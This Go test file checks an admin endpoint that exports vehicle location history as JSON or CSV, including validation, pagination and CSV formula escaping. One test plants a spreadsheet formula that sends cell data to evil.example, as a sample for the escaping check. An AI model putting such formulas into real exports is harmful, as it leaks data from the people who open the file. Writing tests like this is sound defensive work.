package main

import (
	"context"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

type mockLocationHistoryLister struct {
	points        []LocationPoint
	err           error
	capturedFrom  int64
	capturedTo    int64
	capturedLimit int
}

func (m *mockLocationHistoryLister) GetLocationHistory(_ context.Context, _ string, from, to int64, limit int) ([]LocationPoint, error) {
	m.capturedFrom = from
	m.capturedTo = to
	m.capturedLimit = limit
	if m.err != nil {
		return nil, m.err
	}
	return m.points, nil
}

type mockVehicleChecker struct {
	exists bool
	err    error
}

func (m *mockVehicleChecker) VehicleExists(_ context.Context, _ string) (bool, error) {
	return m.exists, m.err
}

func newHistoryRequest(vehicleID string, query string) *http.Request {
	path := "/api/v1/admin/vehicles/placeholder/locations"
	if query != "" {
		path += "?" + query
	}
	r := httptest.NewRequest(http.MethodGet, path, nil)
	r.SetPathValue("vehicleID", vehicleID)
	return r
}

func TestHandleGetLocationHistory_Success(t *testing.T) {
	now := time.Now().UTC()
	lister := &mockLocationHistoryLister{
		points: []LocationPoint{
			{
				Latitude: -1.29, Longitude: 36.82,
				Bearing: float64ptr(180.0), Speed: float64ptr(8.5), Accuracy: float64ptr(12.0),
				Timestamp: now.Unix(), TripID: "trip-1", ReceivedAt: now,
			},
		},
	}
	checker := &mockVehicleChecker{exists: true}
	handler := handleGetLocationHistory(lister, checker)

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, newHistoryRequest("vehicle-042", ""))

	assert.Equal(t, http.StatusOK, w.Code)

	var resp locationHistoryResponse
	require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
	assert.Equal(t, "vehicle-042", resp.VehicleID)
	assert.Equal(t, 1, resp.Count)
	assert.False(t, resp.HasMore)
	require.Len(t, resp.Locations, 1)
	assert.Equal(t, -1.29, resp.Locations[0].Latitude)
	assert.Equal(t, 36.82, resp.Locations[0].Longitude)
	require.NotNil(t, resp.Locations[0].Bearing)
	assert.Equal(t, 180.0, *resp.Locations[0].Bearing)
	require.NotNil(t, resp.Locations[0].Speed)
	assert.Equal(t, 8.5, *resp.Locations[0].Speed)
	assert.Equal(t, "trip-1", resp.Locations[0].TripID)
}

func TestHandleGetLocationHistory_CSV(t *testing.T) {
	now := time.Now().UTC()
	lister := &mockLocationHistoryLister{
		points: []LocationPoint{
			{
				Latitude: -1.29, Longitude: 36.82,
				Bearing: float64ptr(180.0), Speed: float64ptr(8.5), Accuracy: float64ptr(12.0),
				Timestamp: 1752566400, TripID: "trip-1", ReceivedAt: now,
			},
		},
	}
	checker := &mockVehicleChecker{exists: true}
	handler := handleGetLocationHistory(lister, checker)

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, newHistoryRequest("vehicle-042", "format=csv"))

	assert.Equal(t, http.StatusOK, w.Code)
	assert.Equal(t, "text/csv", w.Header().Get("Content-Type"))
	assert.Contains(t, w.Header().Get("Content-Disposition"), "vehicle-042_locations.csv")

	reader := csv.NewReader(w.Body)
	records, err := reader.ReadAll()
	require.NoError(t, err)
	require.Len(t, records, 2, "header + 1 data row")

	assert.Equal(t, []string{"timestamp", "latitude", "longitude", "bearing", "speed", "accuracy", "trip_id", "received_at"}, records[0])
	assert.Equal(t, "1752566400", records[1][0])
	assert.Equal(t, "-1.29", records[1][1])
	assert.Equal(t, "36.82", records[1][2])
	assert.Equal(t, "180", records[1][3])
	assert.Equal(t, "8.5", records[1][4])
	assert.Equal(t, "12", records[1][5])
	assert.Equal(t, "trip-1", records[1][6])
}

func TestHandleGetLocationHistory_DefaultParams(t *testing.T) {
	lister := &mockLocationHistoryLister{points: make([]LocationPoint, 0)}
	checker := &mockVehicleChecker{exists: true}
	handler := handleGetLocationHistory(lister, checker)

	expectedFrom := time.Now().Unix() - 86400
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, newHistoryRequest("bus-1", ""))

	assert.Equal(t, http.StatusOK, w.Code)
	var resp locationHistoryResponse
	require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
	assert.Equal(t, 0, resp.Count)
	assert.NotNil(t, resp.Locations, "locations should be empty array, not null")
	assert.Len(t, resp.Locations, 0)
	assert.InDelta(t, expectedFrom, lister.capturedFrom, 2, "default from should be ~24h ago")
}

func TestHandleGetLocationHistory_EmptyHistory(t *testing.T) {
	lister := &mockLocationHistoryLister{points: make([]LocationPoint, 0)}
	checker := &mockVehicleChecker{exists: true}
	handler := handleGetLocationHistory(lister, checker)

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, newHistoryRequest("bus-empty", ""))

	assert.Equal(t, http.StatusOK, w.Code)

	body := w.Body.String()
	assert.Contains(t, body, `"locations":[]`)
}

func TestHandleGetLocationHistory_VehicleNotFound(t *testing.T) {
	lister := &mockLocationHistoryLister{}
	checker := &mockVehicleChecker{exists: false}
	handler := handleGetLocationHistory(lister, checker)

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, newHistoryRequest("ghost-bus", ""))

	assert.Equal(t, http.StatusNotFound, w.Code)

	var resp map[string]string
	require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
	assert.Contains(t, resp["error"], "vehicle not found")
}

func TestHandleGetLocationHistory_InvalidVehicleID(t *testing.T) {
	lister := &mockLocationHistoryLister{}
	checker := &mockVehicleChecker{}
	handler := handleGetLocationHistory(lister, checker)

	tests := []struct {
		name      string
		vehicleID string
		wantErr   string
	}{
		{"special characters", "bus@#$", "alphanumeric"},
		{"spaces", "bus 1", "alphanumeric"},
		{"empty", "", "vehicle_id is required"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			w := httptest.NewRecorder()
			handler.ServeHTTP(w, newHistoryRequest(tt.vehicleID, ""))

			assert.Equal(t, http.StatusBadRequest, w.Code)
			var resp map[string]string
			require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
			assert.Contains(t, resp["error"], tt.wantErr)
		})
	}
}

func TestHandleGetLocationHistory_VehicleIDTooLong(t *testing.T) {
	tests := []struct {
		name       string
		vehicleID  string
		wantStatus int
		wantErr    string
	}{
		{"50 chars accepted", strings.Repeat("a", 50), http.StatusOK, ""},
		{"51 chars rejected", strings.Repeat("a", 51), http.StatusBadRequest, "at most 50"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			lister := &mockLocationHistoryLister{points: make([]LocationPoint, 0)}
			checker := &mockVehicleChecker{exists: true}
			handler := handleGetLocationHistory(lister, checker)

			w := httptest.NewRecorder()
			handler.ServeHTTP(w, newHistoryRequest(tt.vehicleID, ""))
			assert.Equal(t, tt.wantStatus, w.Code)

			if tt.wantErr != "" {
				var resp map[string]string
				require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
				assert.Contains(t, resp["error"], tt.wantErr)
			}
		})
	}
}

func TestHandleGetLocationHistory_InvalidLimit(t *testing.T) {
	lister := &mockLocationHistoryLister{}
	checker := &mockVehicleChecker{exists: true}
	handler := handleGetLocationHistory(lister, checker)

	tests := []struct {
		name  string
		query string
	}{
		{"zero", "limit=0"},
		{"negative", "limit=-1"},
		{"over max", "limit=1001"},
		{"non-numeric", "limit=abc"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			w := httptest.NewRecorder()
			handler.ServeHTTP(w, newHistoryRequest("bus-1", tt.query))

			assert.Equal(t, http.StatusBadRequest, w.Code)
			var resp map[string]string
			require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
			assert.Contains(t, resp["error"], "limit")
		})
	}
}

func TestHandleGetLocationHistory_InvalidTimestamp(t *testing.T) {
	lister := &mockLocationHistoryLister{}
	checker := &mockVehicleChecker{exists: true}
	handler := handleGetLocationHistory(lister, checker)

	tests := []struct {
		name    string
		query   string
		wantErr string
	}{
		{"non-numeric from", "from=abc", "from"},
		{"non-numeric to", "to=xyz", "to"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			w := httptest.NewRecorder()
			handler.ServeHTTP(w, newHistoryRequest("bus-1", tt.query))

			assert.Equal(t, http.StatusBadRequest, w.Code)
			var resp map[string]string
			require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
			assert.Contains(t, resp["error"], tt.wantErr)
		})
	}
}

func TestHandleGetLocationHistory_FromGreaterThanTo(t *testing.T) {
	lister := &mockLocationHistoryLister{}
	checker := &mockVehicleChecker{exists: true}
	handler := handleGetLocationHistory(lister, checker)

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, newHistoryRequest("bus-1", "from=2000&to=1000"))

	assert.Equal(t, http.StatusBadRequest, w.Code)
	var resp map[string]string
	require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
	assert.Contains(t, resp["error"], "from must be less than or equal to to")
}

func TestHandleGetLocationHistory_StoreError(t *testing.T) {
	lister := &mockLocationHistoryLister{err: fmt.Errorf("database connection lost")}
	checker := &mockVehicleChecker{exists: true}
	handler := handleGetLocationHistory(lister, checker)

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, newHistoryRequest("bus-1", ""))

	assert.Equal(t, http.StatusInternalServerError, w.Code)
	var resp map[string]string
	require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
	assert.Contains(t, resp["error"], "internal server error")
}

func TestHandleGetLocationHistory_CheckerError(t *testing.T) {
	lister := &mockLocationHistoryLister{}
	checker := &mockVehicleChecker{err: fmt.Errorf("database connection lost")}
	handler := handleGetLocationHistory(lister, checker)

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, newHistoryRequest("bus-1", ""))

	assert.Equal(t, http.StatusInternalServerError, w.Code)
	var resp map[string]string
	require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
	assert.Contains(t, resp["error"], "internal server error")
}

func TestHandleGetLocationHistory_NullableFieldsJSON(t *testing.T) {
	lister := &mockLocationHistoryLister{
		points: []LocationPoint{
			{Latitude: 1.0, Longitude: 2.0, Bearing: nil, Speed: nil, Accuracy: nil, Timestamp: time.Now().Unix(), ReceivedAt: time.Now()},
			{Latitude: 3.0, Longitude: 4.0, Bearing: float64ptr(0), Speed: float64ptr(0), Accuracy: float64ptr(0), Timestamp: time.Now().Unix() - 60, ReceivedAt: time.Now()},
		},
	}
	checker := &mockVehicleChecker{exists: true}
	handler := handleGetLocationHistory(lister, checker)

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, newHistoryRequest("bus-1", ""))

	assert.Equal(t, http.StatusOK, w.Code)

	var resp locationHistoryResponse
	require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
	require.Len(t, resp.Locations, 2)

	assert.Nil(t, resp.Locations[0].Bearing, "nil bearing should serialize as null")
	assert.Nil(t, resp.Locations[0].Speed)
	assert.Nil(t, resp.Locations[0].Accuracy)

	require.NotNil(t, resp.Locations[1].Bearing, "zero bearing should not be nil")
	assert.Equal(t, 0.0, *resp.Locations[1].Bearing)
	require.NotNil(t, resp.Locations[1].Speed)
	assert.Equal(t, 0.0, *resp.Locations[1].Speed)
}

func TestHandleGetLocationHistory_CSVNullableFields(t *testing.T) {
	lister := &mockLocationHistoryLister{
		points: []LocationPoint{
			{Latitude: 1.0, Longitude: 2.0, Bearing: nil, Speed: nil, Accuracy: nil, Timestamp: 1752566400, ReceivedAt: time.Now()},
		},
	}
	checker := &mockVehicleChecker{exists: true}
	handler := handleGetLocationHistory(lister, checker)

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, newHistoryRequest("bus-1", "format=csv"))

	reader := csv.NewReader(w.Body)
	records, err := reader.ReadAll()
	require.NoError(t, err)
	require.Len(t, records, 2)

	assert.Equal(t, "", records[1][3], "nil bearing should be empty in CSV")
	assert.Equal(t, "", records[1][4], "nil speed should be empty in CSV")
	assert.Equal(t, "", records[1][5], "nil accuracy should be empty in CSV")
}

func TestHandleGetLocationHistory_BoundaryLimit(t *testing.T) {
	lister := &mockLocationHistoryLister{points: make([]LocationPoint, 0)}
	checker := &mockVehicleChecker{exists: true}
	handler := handleGetLocationHistory(lister, checker)

	w1 := httptest.NewRecorder()
	handler.ServeHTTP(w1, newHistoryRequest("bus-1", "limit=1"))
	assert.Equal(t, http.StatusOK, w1.Code, "limit=1 should be accepted")

	w1000 := httptest.NewRecorder()
	handler.ServeHTTP(w1000, newHistoryRequest("bus-1", "limit=1000"))
	assert.Equal(t, http.StatusOK, w1000.Code, "limit=1000 should be accepted")

	w1001 := httptest.NewRecorder()
	handler.ServeHTTP(w1001, newHistoryRequest("bus-1", "limit=1001"))
	assert.Equal(t, http.StatusBadRequest, w1001.Code, "limit=1001 should be rejected")
}

func TestHandleGetLocationHistory_InvalidFormat(t *testing.T) {
	lister := &mockLocationHistoryLister{}
	checker := &mockVehicleChecker{exists: true}
	handler := handleGetLocationHistory(lister, checker)

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, newHistoryRequest("bus-1", "format=xml"))

	assert.Equal(t, http.StatusBadRequest, w.Code)
	var resp map[string]string
	require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
	assert.Contains(t, resp["error"], "format must be json or csv")
}

func TestSanitizeCSVCell(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{"equals prefix", "=1+2", "'=1+2"},
		{"plus prefix", "+SUM(A1)", "'+SUM(A1)"},
		{"minus prefix", "-2+3", "'-2+3"},
		{"at prefix", "@cmd", "'@cmd"},
		{"tab prefix", "\tx", "'\tx"},
		{"carriage return prefix", "\rx", "'\rx"},
		{"empty", "", ""},
		{"plain", "trip-1", "trip-1"},
		{"formula char mid-string", "trip=1", "trip=1"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, tt.want, sanitizeCSVCell(tt.in))
		})
	}
}

func TestHandleGetLocationHistory_CSVFormulaInjection(t *testing.T) {
	now := time.Now().UTC()
	lister := &mockLocationHistoryLister{
		points: []LocationPoint{
			{Latitude: 1, Longitude: 2, Timestamp: now.Unix(), TripID: `=HYPERLINK("https://evil.example/?d="&A1,"open")`, ReceivedAt: now},
			{Latitude: 1, Longitude: 2, Timestamp: now.Unix() - 60, TripID: "+SUM(A1:A9)", ReceivedAt: now},
			{Latitude: 1, Longitude: 2, Timestamp: now.Unix() - 120, TripID: "-2+3", ReceivedAt: now},
			{Latitude: 1, Longitude: 2, Timestamp: now.Unix() - 180, TripID: "@cmd", ReceivedAt: now},
			{Latitude: 1, Longitude: 2, Timestamp: now.Unix() - 240, TripID: "trip-1", ReceivedAt: now},
		},
	}
	checker := &mockVehicleChecker{exists: true}
	handler := handleGetLocationHistory(lister, checker)

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, newHistoryRequest("bus-1", "format=csv"))

	assert.Equal(t, http.StatusOK, w.Code)

	reader := csv.NewReader(w.Body)
	records, err := reader.ReadAll()
	require.NoError(t, err)
	require.Len(t, records, 6, "header + 5 data rows")

	assert.Equal(t, `'=HYPERLINK("https://evil.example/?d="&A1,"open")`, records[1][6], "formula prefix = must be escaped")
	assert.Equal(t, "'+SUM(A1:A9)", records[2][6], "formula prefix + must be escaped")
	assert.Equal(t, "'-2+3", records[3][6], "formula prefix - must be escaped")
	assert.Equal(t, "'@cmd", records[4][6], "formula prefix @ must be escaped")
	assert.Equal(t, "trip-1", records[5][6], "safe trip_id must pass through unchanged")
}

func TestHandleGetLocationHistory_HasMore(t *testing.T) {
	now := time.Now().UTC()
	points := []LocationPoint{
		{Latitude: 1, Longitude: 2, Timestamp: now.Unix(), ReceivedAt: now},
		{Latitude: 3, Longitude: 4, Timestamp: now.Unix() - 60, ReceivedAt: now},
		{Latitude: 5, Longitude: 6, Timestamp: now.Unix() - 120, ReceivedAt: now},
	}

	t.Run("truncated at limit", func(t *testing.T) {
		lister := &mockLocationHistoryLister{points: points}
		checker := &mockVehicleChecker{exists: true}
		handler := handleGetLocationHistory(lister, checker)

		w := httptest.NewRecorder()
		handler.ServeHTTP(w, newHistoryRequest("bus-1", "limit=2"))

		assert.Equal(t, http.StatusOK, w.Code)
		assert.Equal(t, 3, lister.capturedLimit, "handler should fetch limit+1 to detect truncation")

		var resp locationHistoryResponse
		require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
		assert.True(t, resp.HasMore)
		assert.Equal(t, 2, resp.Count)
		assert.Len(t, resp.Locations, 2)
	})

	t.Run("not truncated", func(t *testing.T) {
		lister := &mockLocationHistoryLister{points: points}
		checker := &mockVehicleChecker{exists: true}
		handler := handleGetLocationHistory(lister, checker)

		w := httptest.NewRecorder()
		handler.ServeHTTP(w, newHistoryRequest("bus-1", "limit=3"))

		assert.Equal(t, http.StatusOK, w.Code)

		var resp locationHistoryResponse
		require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
		assert.False(t, resp.HasMore)
		assert.Equal(t, 3, resp.Count)
		assert.Len(t, resp.Locations, 3)
	})

	t.Run("csv trimmed to limit", func(t *testing.T) {
		lister := &mockLocationHistoryLister{points: points}
		checker := &mockVehicleChecker{exists: true}
		handler := handleGetLocationHistory(lister, checker)

		w := httptest.NewRecorder()
		handler.ServeHTTP(w, newHistoryRequest("bus-1", "limit=2&format=csv"))

		reader := csv.NewReader(w.Body)
		records, err := reader.ReadAll()
		require.NoError(t, err)
		assert.Len(t, records, 3, "header + limit rows, extra detection row trimmed")
	})
}

func TestHandleGetLocationHistory_ToOnly(t *testing.T) {
	lister := &mockLocationHistoryLister{points: make([]LocationPoint, 0)}
	checker := &mockVehicleChecker{exists: true}
	handler := handleGetLocationHistory(lister, checker)

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, newHistoryRequest("bus-1", "to=1000000"))

	assert.Equal(t, http.StatusOK, w.Code, "past ?to= alone must select the 24h window ending at to, not 400")
	assert.Equal(t, int64(1000000), lister.capturedTo)
	assert.Equal(t, int64(1000000-86400), lister.capturedFrom, "from should default to to-86400")
}
